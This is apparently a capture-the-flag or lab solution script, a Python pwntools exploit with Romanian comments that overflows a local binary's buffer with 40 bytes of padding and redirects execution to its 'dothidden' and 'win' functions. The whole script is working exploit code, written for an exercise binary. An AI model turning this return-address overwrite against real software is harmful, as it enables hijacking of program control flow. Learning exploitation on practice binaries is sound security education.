#!/usr/bin/env python3
from pwn import *

target = process("./bin/bonus")
elf = ELF("./bin/bonus")

# Offset corect: 40 octeți (găsit prin bruteforce)
payload  = b"A" * 40
payload += p64(elf.symbols["dothidden"])
payload += p64(elf.symbols["win"])

target.sendline(payload)
print("[+] Output program:")
print(target.recvall().decode())
